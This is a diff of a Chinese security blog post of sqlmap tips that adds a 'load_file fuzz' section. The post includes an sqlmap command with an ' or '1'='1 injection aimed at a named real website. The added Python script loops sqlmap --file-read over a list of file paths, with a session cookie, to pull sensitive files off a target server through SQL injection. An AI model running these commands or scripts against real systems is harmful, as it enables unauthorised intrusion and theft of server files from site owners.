@@ -11,24 +11,24 @@
     
 
     
-    <meta name="description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file
+    <meta name="description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file2016-05-26:更新load_file fuzz
 –randomize--randomize=RPARAM  Randomly change value for given parameter(s)
-sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会">
+sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmap使用手册">
 <meta property="og:url" content="http://xdxd.love/2015/11/10/sqlmap使用tips/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file
+<meta property="og:description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file2016-05-26:更新load_file fuzz
 –randomize--randomize=RPARAM  Randomly change value for given parameter(s)
-sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会">
+sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户">
 <meta property="og:image" content="http://xdxd.love/images/sqlmaprisk1.png">
 <meta property="og:image" content="http://xdxd.love/images/sqlmaprisk2.png">
-<meta property="og:updated_time" content="2016-05-25T07:08:35.000Z">
+<meta property="og:updated_time" content="2016-05-26T07:01:38.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmap使用手册">
-<meta name="twitter:description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file
+<meta name="twitter:description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file2016-05-26:更新load_file fuzz
 –randomize--randomize=RPARAM  Randomly change value for given parameter(s)
-sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会">
+sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -104,11 +104,11 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#burpsuite_save_to_file"><span class="toc-number">4.</span> <span class="toc-text">burpsuite save to file</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#burpsuite_save_to_file"><span class="toc-number">4.</span> <span class="toc-text">burpsuite save to file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#load_file_fuzz"><span class="toc-number">5.</span> <span class="toc-text">load_file fuzz</span></a></li></ol>
 		
 		</div>
 		
-		<h1 id="update">update</h1><p>2016-05-18:更新randomize<br>2016-05-25:更新burpsuite save to file</p>
+		<h1 id="update">update</h1><p>2016-05-18:更新randomize<br>2016-05-25:更新burpsuite save to file<br>2016-05-26:更新load_file fuzz</p>
 <h1 id="–randomize">–randomize</h1><pre><code>--randomize=RPARAM  Randomly change value <span class="keyword">for</span> given <span class="function"><span class="title">parameter</span><span class="params">(s)</span></span>
 </code></pre><p>sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会导致无法进入后续的逻辑从而无法检测SQL注入。使用randomize指定这个参数随机就可以了。</p>
 <h1 id="risk_3">risk 3</h1><p>测试一个注入点，手工测试验证应该存在注入但是用sqlmap没跑出来。测试发现需要指定risk 3，sqlmap才会使用or语句进行测试，才可以识别出这个注入点。</p>
@@ -118,6 +118,18 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 <p>所以这里可以直接使用risk 3参数或者在code参数后面拼or语句。</p>
 <pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951' or '1'='1&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">1</span> --dbs --dbms=mysql --risk <span class="number">1</span>
 </code></pre><h1 id="burpsuite_save_to_file">burpsuite save to file</h1><p>测试一个multipart/form-data里参数的注入，返现复制请求文本到文件中，在使用sqlmap r参数指定请求更自己在burpsuite测试的结果不一样，通过对比发现，复制的请求中忽略了原始请求中每个参数后面的%0d符号。导致服务端无法进行了不一样的处理。直接使用burpsuite中右键save to file保存请求，再使用sqlmap r参数就可以。</p>
+<h1 id="load_file_fuzz">load_file fuzz</h1><p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。<br>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：SQLNuke——mysql 注入load_file Fuzz工具.<br>不过sqlnuke看说明只支持回显的union的的方式。写一个下脚本用sqlmap来fuzz load_file也是一个不错的方式。</p>
+<pre><code><span class="comment">#!/usr/bin/env python</span>
+<span class="comment"># encoding: utf-8</span>
+import subprocess
+filepaths = <span class="keyword">open</span>(<span class="string">'filelist.txt'</span>)
+<span class="keyword">for</span> filepath in filepaths:
+    cmdline = <span class="string">"python /Users/xxxxxx/security/web/sqlmap/sqlmap.py -u 'http://1.1.25.41/cms/privilege/publist?level=3&amp;title=jj' --cookie='_pss=PcqD<span class="variable">%2BvOIi05CQLYgBqHVE</span><span class="variable">%2Bm9oeAswCYOYYyZZTA0b4wk8KUMrHTuBJmyyZdqch</span><span class="variable">%2Fpwd</span><span class="variable">%2F7QcVCaehUtF0QHhpgkJliaAruL0dxGR</span><span class="variable">%2B8mwM0</span><span class="variable">%2FGc</span><span class="variable">%3D</span>' --batch --file-read="</span> +filepath
+    fuzzsqlmap_proc = subprocess.Popen(cmdline,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    <span class="keyword">print</span> filepath
+    process_output = fuzzsqlmap_proc.stdout.readlines()
+    <span class="keyword">print</span> process_output
+</code></pre><p>使用python，几行代码就可以搞定。然后到sqlmap输出目录里根据文件大小查看下载下来的文件就可以了。感觉，根据目标系统的环境，搭建一个一样的系统，然后列出所有的文件作为字典来进行fuzz应该是一个不错的思路。<br>尝试load_file(目录)，返回为null，如果可以load_file目录的话~~</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -184,7 +196,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#burpsuite_save_to_file"><span class="toc-number">4.</span> <span class="toc-text">burpsuite save to file</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#burpsuite_save_to_file"><span class="toc-number">4.</span> <span class="toc-text">burpsuite save to file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#load_file_fuzz"><span class="toc-number">5.</span> <span class="toc-text">load_file fuzz</span></a></li></ol>
  
   </div>
 
@@ -234,7 +246,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 		  
 		
 		  
-			<li><a href="/categories/渗透测试/" title="渗透测试">渗透测试<sup>7</sup></a></li>
+			<li><a href="/categories/渗透测试/" title="渗透测试">渗透测试<sup>6</sup></a></li>
 		  
 		
 		  
@@ -287,11 +299,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 			
 		
 			
-				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/解包/" title="解包">解包<sup>1</sup></a></li>
+				<li><a href="/tags/任意文件删除/" title="任意文件删除">任意文件删除<sup>1</sup></a></li>
 			
 		
 			
@@ -303,7 +311,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 			
 		
 			
-				<li><a href="/tags/逻辑漏洞/" title="逻辑漏洞">逻辑漏洞<sup>1</sup></a></li>
+				<li><a href="/tags/固件/" title="固件">固件<sup>1</sup></a></li>
 			
 		
 			
@@ -327,7 +335,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 			
 		
 			
-				<li><a href="/tags/固件/" title="固件">固件<sup>1</sup></a></li>
+				<li><a href="/tags/折腾/" title="折腾">折腾<sup>1</sup></a></li>
 			
 		
 			
@@ -335,11 +343,15 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 			
 		
 			
-				<li><a href="/tags/物联网/" title="物联网">物联网<sup>1</sup></a></li>
+				<li><a href="/tags/解包/" title="解包">解包<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/任意文件删除/" title="任意文件删除">任意文件删除<sup>1</sup></a></li>
+				<li><a href="/tags/ssi/" title="ssi">ssi<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sqli/" title="sqli">sqli<sup>1</sup></a></li>
 			
 		
 		</ul>
